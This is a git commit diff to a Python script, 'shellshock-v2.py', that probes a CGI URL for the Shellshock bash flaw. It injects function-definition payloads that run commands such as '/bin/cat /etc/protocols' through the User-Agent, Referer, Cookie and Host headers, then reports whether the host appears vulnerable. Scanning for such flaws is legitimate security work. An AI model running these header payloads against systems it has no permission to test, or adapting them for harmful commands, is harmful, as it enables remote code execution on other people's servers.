8a24a32e3a9f78927dd11f1ef997106494e9267e
William Fox <williamfox@gmail.com>
2014-10-01 11:28:03 -0700

    add loop for multiple headers

--- shellshock-v2.py
+++ shellshock-v2.py
@@ -11,25 +11,31 @@ if (len(sys.argv)<=1) or (len(sys.argv)>2):
     print ('Example: %s http://10.10.35.163/cgi-bin/example-bash.sh' % sys.argv[0])
     exit(0)
 
-## Dict of payloads
+## Dict of payloads and list of header options
 '''
 1: list protocols from /etc/ on host
 '''
 payloads = {1:'() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/protocols',
+            2:'() { ;;}; echo \"Busted\"',
            }
 http_headers = ['User-Agent', 'Referer', 'Cookie', 'Host']
+
+#use urlparse to parse argument submitted by user
 o = urlparse(sys.argv[1])
 confirm = ' appears VULNERABLE!'
 allClear = ' does not appear VULNERABLE.'
 
 ## for each payload, launch request to check for shellshock
 for each in payloads:
+    #parse url stored in o
     query = o.scheme + '://' + o.netloc + o.path
+    #loop through each header type
     for heads in http_headers:
+        #make the request and store results
         results = requests.get(query, headers={heads:payloads[each]})
         soup = BeautifulSoup(results.text)
         match = str(soup.body.p)
-        if (len(match)!= 0) or match != 'None':
+        if match != 'None':
             if 'tcp' in match:
                 print ('Host: ' + query + confirm)
                 print ('Payload: ' + str(heads) + str(payloads[each]))
